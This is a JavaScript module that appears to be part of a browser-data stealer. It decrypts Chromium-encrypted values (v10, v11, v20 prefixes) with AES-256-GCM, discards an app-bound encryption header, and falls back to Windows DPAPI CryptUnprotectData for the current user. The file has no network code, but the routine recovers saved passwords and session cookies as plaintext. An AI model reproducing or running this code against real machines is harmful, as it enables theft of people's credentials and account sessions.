Object.defineProperty(exports, "__esModule", {
  value: true
});
const crypto = require("crypto");
const WinApi = require("../core/WinApi.js");
class DataDecryptor {
  static decrypt(encrypted, key) {
    if (!encrypted || encrypted.length < 3) return null;
    const version = encrypted.slice(0, 3).toString();
    try {
      if (["v10", "v11", "v80", "v20"].includes(version)) {
        if (encrypted.length < 31 || !Buffer.isBuffer(key) || key.length !== 32) return null;
        const iv = encrypted.slice(3, 15);
        const tag = encrypted.slice(encrypted.length - 16);
        const ciphertext = encrypted.slice(15, encrypted.length - 16);
        let decrypted;
        try {
          const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
          decipher.setAuthTag(tag);
          decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
        } catch (error) {
          try {
            const fallbackCiphertext = encrypted.slice(15, encrypted.length - 16);
            const fallbackTag = encrypted.slice(encrypted.length - 16);
            const fallback = crypto.createDecipheriv("aes-256-gcm", key, iv);
            fallback.setAuthTag(fallbackTag);
            decrypted = Buffer.concat([fallback.update(fallbackCiphertext), fallback.final()]);
          } catch (error) {
            return null;
          }
        }
        if (!decrypted) return null;
        if (decrypted.length > 32) {
          const prefix = decrypted.slice(0, 32);
          let nonPrintable = 0;
          for (let index = 0; index < prefix.length; index++) if (prefix[index] < 32 || prefix[index] > 126) nonPrintable++;
          if (nonPrintable > 3) {
            const remainder = decrypted.slice(32).toString("utf8").replace(new RegExp("\\0", "g"), "").trim();
            const sanitized = this.sanitizeString(remainder);
            if (sanitized) return sanitized;
          }
        }
        const text = decrypted.toString("utf8").replace(new RegExp("\\0", "g"), "").trim();
        return this.sanitizeString(text);
      }
      try {
        const unprotect = WinApi.CryptUnprotectData;
        const plaintext = unprotect(encrypted, null, "CurrentUser");
        if (plaintext) return this.sanitizeString(plaintext.toString("utf8"));
      } catch (error) {
        try {
          const unprotect = WinApi.CryptUnprotectData;
          const plaintext = unprotect(encrypted);
          if (plaintext) return this.sanitizeString(plaintext.toString("utf8"));
        } catch (error) {
          return null;
        }
      }
      return null;
    } catch (error) {
      return null;
    }
  }
  static sanitizeString(text) {
    const sanitized = text.replace(new RegExp("[^\\x20-\\x7E]", "g"), "").trim();
    return sanitized.length > 0 ? sanitized : null;
  }
}
exports.DataDecryptor = DataDecryptor;
